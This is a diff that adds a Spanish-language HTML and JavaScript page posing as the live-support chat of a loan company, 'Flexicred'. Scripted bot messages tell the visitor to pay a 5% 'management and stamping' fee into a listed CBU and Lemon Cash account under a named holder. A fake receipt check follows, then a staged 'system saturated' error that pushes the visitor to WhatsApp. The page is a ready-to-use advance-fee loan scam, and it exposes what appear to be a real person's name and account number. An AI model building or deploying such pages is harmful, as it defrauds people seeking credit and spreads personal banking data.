@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Flexicred - Soporte en Vivo</title>
+    <style>
+        body { background: #f4f7f9; margin: 0; font-family: sans-serif; }
+        
+        /* Header del Chat */
+        .chat-header {
+            background: var(--primary);
+            padding: 15px 20px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .status-dot {
+            width: 10px; height: 10px;
+            background: #10b981;
+            border-radius: 50%;
+            border: 2px solid white;
+        }
+
+        /* Burbujas de Chat */
+        .chat-container {
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            padding-bottom: 100px;
+        }
+
+        .msg {
+            max-width: 85%;
+            padding: 12px 16px;
+            border-radius: 18px;
+            font-size: 0.92rem;
+            line-height: 1.4;
+            position: relative;
+        }
+
+        .msg-bot {
+            background: white;
+            color: #1e293b;
+            align-self: flex-start;
+            border-bottom-left-radius: 4px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        .msg-user {
+            background: var(--primary);
+            color: white;
+            align-self: flex-end;
+            border-bottom-right-radius: 4px;
+        }
+
+        /* Caja de Transferencia */
+        .transfer-card {
+            background: #f8fafc;
+            border: 2px dashed #cbd5e1;
+            border-radius: 15px;
+            padding: 15px;
+            margin-top: 10px;
+        }
+
+        .copy-button {
+            background: #e2e8f0;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-left: 5px;
+        }
+
+        /* Barra de entrada */
+        .chat-input-area {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            max-width: 430px;
+            background: white;
+            padding: 15px;
+            display: flex;
+            gap: 10px;
+            box-sizing: border-box;
+            border-top: 1px solid #e2e8f0;
+        }
+
+        #input-msg {
+            flex-grow: 1;
+            border: 1px solid #e2e8f0;
+            padding: 12px;
+            border-radius: 25px;
+            outline: none;
+        }
+
+        .btn-send {
+            background: var(--primary);
+            color: white;
+            border: none;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <div class="chat-header">
+            <div style="position: relative;">
+                <img src="https://ui-avatars.com/api/?name=Soporte+Flexicred&background=fff&color=1e3a8a" style="width: 40px; border-radius: 50%;">
+                <div class="status-dot" style="position: absolute; bottom: 0; right: 0;"></div>
+            </div>
+            <div>
+                <p style="margin: 0; font-weight: bold; font-size: 0.95rem;">Asesoría Flexicred</p>
+                <small style="opacity: 0.8;">En línea ahora</small>
+            </div>
+        </div>
+
+        <div class="chat-container" id="chat-box">
+            <div class="msg msg-bot">
+                Hola <strong><span class="span-nombre">Usuario</span></strong>, soy tu asesor asignado. He verificado tu solicitud por <strong><span class="span-monto">$0</span></strong>.
+            </div>
+
+            <div class="msg msg-bot">
+                Para finalizar el desembolso y liberar los fondos a tu CBU, es necesario cubrir el 5% de <strong>Gastos de Gestión y Sellado</strong> que aceptaste en el contrato.
+            </div>
+
+            <div class="msg msg-bot">
+                El monto exacto a abonar es: <br>
+                <strong style="font-size: 1.2rem; color: #ef4444;" class="span-tarifa">$0</strong>
+                
+                <div class="transfer-card">
+                    <p style="margin: 0 0 5px 0; font-size: 0.75rem; color: #64748b;">DATOS DE DEPÓSITO:</p>
+                    <p style="margin: 5px 0; font-size: 0.85rem;"><strong>CBU:</strong> 0000168300000021716126 <button class="copy-button" onclick="copiarAlPortapapeles('0000168300000021716126')">Copiar</button></p>
+                    <p style="margin: 5px 0; font-size: 0.85rem;"><strong>CUENTA:</strong> Lemon Cash <button class="copy-button" onclick="copiarAlPortapapeles('Lemon Cash')">Copiar</button></p>
+                    <p style="margin: 5px 0; font-size: 0.85rem;"><strong>TITULAR:</strong> Maria Alejandra Picallo</p>
+                </div>
+            </div>
+
+            <div class="msg msg-bot">
+                Una vez realizado, por favor adjunta el comprobante por este medio para procesar tu transferencia de inmediato.
+            </div>
+        </div>
+
+        <div class="chat-input-area">
+            <label for="file-input" style="cursor: pointer; display: flex; align-items: center;">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"><path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"/></svg>
+            </label>
+            <input type="file" id="file-input" style="display: none;" onchange="enviarImagen(this)">
+            
+            <input type="text" id="input-msg" placeholder="Escribe un mensaje...">
+            <button class="btn-send" onclick="enviarTexto()">➤</button>
+        </div>
+    </div>
+
+    <script src="main.js"></script>
+    <script>
+        function enviarTexto() {
+            const input = document.getElementById('input-msg');
+            const chatBox = document.getElementById('chat-box');
+            if(input.value.trim() === "") return;
+
+            // Mensaje usuario
+            const userMsg = document.createElement('div');
+            userMsg.className = 'msg msg-user';
+            userMsg.innerText = input.value;
+            chatBox.appendChild(userMsg);
+            
+            input.value = "";
+            window.scrollTo(0, document.body.scrollHeight);
+
+            // Respuesta automática del bot
+            setTimeout(() => {
+                const botMsg = document.createElement('div');
+                botMsg.className = 'msg msg-bot';
+                botMsg.innerText = "Recibido. Por favor, adjunte el comprobante del pago del 5% para que el departamento de finanzas libere su crédito.";
+                chatBox.appendChild(botMsg);
+                window.scrollTo(0, document.body.scrollHeight);
+            }, 1500);
+        }
+
+        function enviarImagen(input) {
+            if (input.files && input.files[0]) {
+                const chatBox = document.getElementById('chat-box');
+                const userMsg = document.createElement('div');
+                userMsg.className = 'msg msg-user';
+                userMsg.innerText = "📎 Comprobante enviado: " + input.files[0].name;
+                chatBox.appendChild(userMsg);
+
+                setTimeout(() => {
+                    const botMsg = document.createElement('div');
+                    botMsg.className = 'msg msg-bot';
+                    botMsg.innerHTML = "<strong>Validando comprobante...</strong><br>Por favor aguarde en línea, estamos verificando el ingreso en nuestra cuenta central.";
+                    chatBox.appendChild(botMsg);
+                    
+                    // Simulación de "Saturado" después de unos segundos
+                    setTimeout(() => {
+                        const errorMsg = document.createElement('div');
+                        errorMsg.className = 'msg msg-bot';
+                        errorMsg.style.background = "#fff1f2";
+                        errorMsg.innerHTML = "⚠️ <strong>Error de validación automática</strong><br>El sistema de Verificación inmediata está saturado. Para no demorar su desembolso, envíe el comprobante a nuestro <strong>WhatsApp Directo</strong> para una carga manual.";
+                        chatBox.appendChild(errorMsg);
+                        
+                        // Botón de WhatsApp
+                        const btnWs = document.createElement('button');
+                        btnWs.innerText = "HABLAR CON ASESOR";
+                        btnWs.style = "width:100%; padding:12px; background:#25d366; color:white; border:none; border-radius:10px; font-weight:bold; margin-top:10px; cursor:pointer;";
+                        btnWs.onclick = () => window.location.href = "https://wa.me/TUNUMERO";
+                        chatBox.appendChild(btnWs);
+                        
+                        window.scrollTo(0, document.body.scrollHeight);
+                    }, 4000);
+                }, 1000);
+            }
+        }
+
+        // Función para copiar al portapapeles
+        function copiarAlPortapapeles(texto) {
+            navigator.clipboard.writeText(texto).then(() => {
+                alert('¡Copiado al portapapeles!');
+            }).catch(() => {
+                // Fallback para navegadores antiguos
+                const elem = document.createElement('textarea');
+                elem.value = texto;
+                document.body.appendChild(elem);
+                elem.select();
+                document.execCommand('copy');
+                document.body.removeChild(elem);
+                alert('¡Copiado al portapapeles!');
+            });
+        }
+    </script>
+</body>
+</html>
